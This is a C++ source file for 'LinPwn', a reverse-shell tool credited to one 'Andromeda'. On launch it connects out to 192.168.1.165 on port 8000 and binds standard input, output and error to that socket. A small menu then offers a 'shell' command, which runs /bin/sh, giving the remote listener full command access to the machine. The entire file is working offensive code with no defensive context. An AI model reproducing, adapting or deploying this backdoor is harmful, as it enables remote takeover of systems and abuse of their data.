// Copyright 2019 <Andromeda>

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/types.h>

#define BUFFER 20


class Initialize {
    const char *ip = "192.168.1.165";
    const int port = 8000;

 public:
    void connection() {
        struct sockaddr_in address;
        const int connecting = socket(AF_INET, SOCK_STREAM, 0);;
        address.sin_family = AF_INET;
        address.sin_addr.s_addr = inet_addr(ip);
        address.sin_port = htons(port);
        connect(connecting, (struct sockaddr *)&address, sizeof(address));
        dup2(connecting, 0);
        dup2(connecting, 1);
        dup2(connecting, 2);
    }
};


struct Modules {
    void help() {
        write(1, "\x1b[32mOptions: \n\0", 15);
        write(1, "1. shell\n\0", 10);
        write(1, "2. exit\n\0", 10);
    }


    void shell() {
        write(1, "\x1b[32mExecuting /bin/sh\n\0", 25);
        system("/bin/sh");
    }


    void quit() {
        write(1, "\x1b[33mClosing connection...\n\0", 28);
        exit(0);
    }
};


void pass() {}
void get_input(char *option) {
    write(1, "\x1b[31m>>> \0", 10);
    fgets(option, 20, stdin);

    for (int i = 0; i <= strnlen(option, BUFFER); i++) {
        if (option[i] == '\n') {
            option[i] = '\0';
        }
    }
}


void handler() {
    Modules modules;;
    char option[BUFFER];
    get_input(option);

    if (strncmp(option, "shell", 5) == 0)
        modules.shell();
    else if (strncmp(option, "help", 4) == 0)
        modules.help();
    else if (strncmp(option, "exit", 4) == 0)
        modules.quit();
    else if (strncmp(option, "", 1) == 0)
        pass();
    else
        write(1, "\x1b[33mNot a valid option\n\0", 25);
}


int main() {
    Initialize init;
    init.connection();
    write(1, "\x1b[32mLinPwn\nCreated By Andromeda.\n\0", 35);
    write(1, "Type help to list modules.\n\0", 28);

    for (;;) {
        handler();
    }

    return 0;
}
